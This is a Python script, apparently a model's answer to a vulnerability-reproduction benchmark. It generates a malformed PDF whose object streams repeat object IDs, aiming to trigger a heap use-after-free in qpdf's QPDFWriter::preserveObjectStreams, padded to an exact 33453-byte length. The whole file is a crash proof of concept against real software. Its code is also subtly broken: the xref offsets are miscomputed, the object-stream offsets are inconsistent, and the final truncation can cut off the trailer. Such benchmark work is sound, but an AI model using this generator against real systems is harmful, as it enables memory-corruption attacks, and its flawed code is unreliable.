import struct
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PDF with object streams that triggers the heap use-after-free
        # This PoC creates multiple object streams with duplicate object IDs
        # to trigger the bug in QPDFWriter::preserveObjectStreams
        
        # PDF header
        pdf = b"%PDF-1.7\n"
        
        # Object 1: Catalog
        catalog_obj = b"1 0 obj\n"
        catalog_obj += b"<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n"
        pdf += catalog_obj
        
        # Object 2: Pages
        pages_obj = b"2 0 obj\n"
        pages_obj += b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n"
        pdf += pages_obj
        
        # Object 3: Page
        page_obj = b"3 0 obj\n"
        page_obj += b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\nendobj\n\n"
        pdf += page_obj
        
        # Object 4: Content stream (empty)
        content_obj = b"4 0 obj\n"
        content_obj += b"<< /Length 0 >>\nstream\nendstream\nendobj\n\n"
        pdf += content_obj
        
        # Create object streams with duplicate object IDs
        # This is the key to trigger the heap use-after-free
        
        # Object stream 5: Contains objects 6 and 7
        obj_stream_data = b""
        # Object 6 (first occurrence)
        obj_stream_data += b"6 0\n"  # Object ID and offset
        obj_stream_data += b"<< /Type /Annot /Subtype /Link /Rect [0 0 100 100] >>\n"
        # Object 7
        obj_stream_data += b"7 100\n"  # Offset for object 7
        obj_stream_data += b"<< /Type /Annot /Subtype /Link /Rect [100 100 200 200] >>\n"
        # Object 6 (second occurrence - duplicate!)
        obj_stream_data += b"6 200\n"  # Same object ID again
        obj_stream_data += b"<< /Type /Annot /Subtype /Link /Rect [200 200 300 300] >>\n"
        
        # Compress the object stream data
        compressed_data = zlib.compress(obj_stream_data)
        
        obj_stream_obj = b"5 0 obj\n"
        obj_stream_obj += b"<<\n"
        obj_stream_obj += b"  /Type /ObjStm\n"
        obj_stream_obj += b"  /N 3\n"  # Number of objects in the stream (including duplicate)
        obj_stream_obj += b"  /First 0\n"
        obj_stream_obj += b"  /Length " + str(len(compressed_data)).encode() + b"\n"
        obj_stream_obj += b"  /Filter /FlateDecode\n"
        obj_stream_obj += b">>\n"
        obj_stream_obj += b"stream\n"
        obj_stream_obj += compressed_data
        obj_stream_obj += b"\nendstream\nendobj\n\n"
        pdf += obj_stream_obj
        
        # Create a second object stream with more duplicates to increase chance of triggering the bug
        obj_stream_data2 = b""
        # Add multiple duplicate entries for object 8
        for i in range(10):
            obj_stream_data2 += b"8 " + str(i * 50).encode() + b"\n"
            obj_stream_data2 += b"<< /Test " + str(i).encode() + b" >>\n"
        
        compressed_data2 = zlib.compress(obj_stream_data2)
        
        obj_stream_obj2 = b"9 0 obj\n"
        obj_stream_obj2 += b"<<\n"
        obj_stream_obj2 += b"  /Type /ObjStm\n"
        obj_stream_obj2 += b"  /N 10\n"  # Number of objects (all duplicates of object 8)
        obj_stream_obj2 += b"  /First 0\n"
        obj_stream_obj2 += b"  /Length " + str(len(compressed_data2)).encode() + b"\n"
        obj_stream_obj2 += b"  /Filter /FlateDecode\n"
        obj_stream_obj2 += b">>\n"
        obj_stream_obj2 += b"stream\n"
        obj_stream_obj2 += compressed_data2
        obj_stream_obj2 += b"\nendstream\nendobj\n\n"
        pdf += obj_stream_obj2
        
        # Add references to the object streams in the trailer
        # Object 10: Object stream reference
        ref_obj = b"10 0 obj\n"
        ref_obj += b"[5 0 R 9 0 R]\nendobj\n\n"
        pdf += ref_obj
        
        # Add more duplicate object stream entries to fill to target length
        # This increases the chance of hitting the bug
        padding_needed = 33453 - len(pdf) - 100  # Reserve space for xref and trailer
        current_obj_num = 11
        
        while len(pdf) < 33453 - 100:
            # Create another object stream with duplicates
            stream_data = b""
            # Add 5 duplicates of the same object
            for j in range(5):
                stream_data += str(current_obj_num).encode() + b" " + str(j * 20).encode() + b"\n"
                stream_data += b"<< /Padding " + str(j).encode() + b" >>\n"
            
            compressed = zlib.compress(stream_data)
            
            stream_obj = str(current_obj_num).encode() + b" 0 obj\n"
            stream_obj += b"<<\n"
            stream_obj += b"  /Type /ObjStm\n"
            stream_obj += b"  /N 5\n"
            stream_obj += b"  /First 0\n"
            stream_obj += b"  /Length " + str(len(compressed)).encode() + b"\n"
            stream_obj += b"  /Filter /FlateDecode\n"
            stream_obj += b">>\n"
            stream_obj += b"stream\n"
            stream_obj += compressed
            stream_obj += b"\nendstream\nendobj\n\n"
            
            pdf += stream_obj
            current_obj_num += 1
            
            # Break if we've added enough padding
            if len(pdf) >= 33453 - 100:
                break
        
        # Xref table
        xref_offset = len(pdf)
        xref = b"xref\n"
        xref += b"0 " + str(current_obj_num).encode() + b"\n"
        xref += b"0000000000 65535 f \n"
        
        # Calculate object offsets
        # We'll use a simple approach since objects are sequential
        offset = 0
        for i in range(1, current_obj_num):
            xref += f"{offset:010d} 00000 n \n".encode()
            # Find the next object
            next_obj = pdf.find(f"{i} 0 obj".encode(), offset)
            if next_obj != -1:
                offset = next_obj
            else:
                # Skip to next likely position
                offset += 100
        
        pdf += xref
        
        # Trailer
        trailer = b"trailer\n"
        trailer += b"<<\n"
        trailer += b"  /Size " + str(current_obj_num).encode() + b"\n"
        trailer += b"  /Root 1 0 R\n"
        trailer += b"  /ID [<00000000000000000000000000000000> <00000000000000000000000000000000>]\n"
        trailer += b">>\n"
        trailer += b"startxref\n"
        trailer += str(xref_offset).encode() + b"\n"
        trailer += b"%%EOF\n"
        
        pdf += trailer
        
        # Trim or pad to exact target length
        if len(pdf) > 33453:
            pdf = pdf[:33453]
        else:
            # Pad with spaces if needed
            pdf += b" " * (33453 - len(pdf))
        
        return pdf
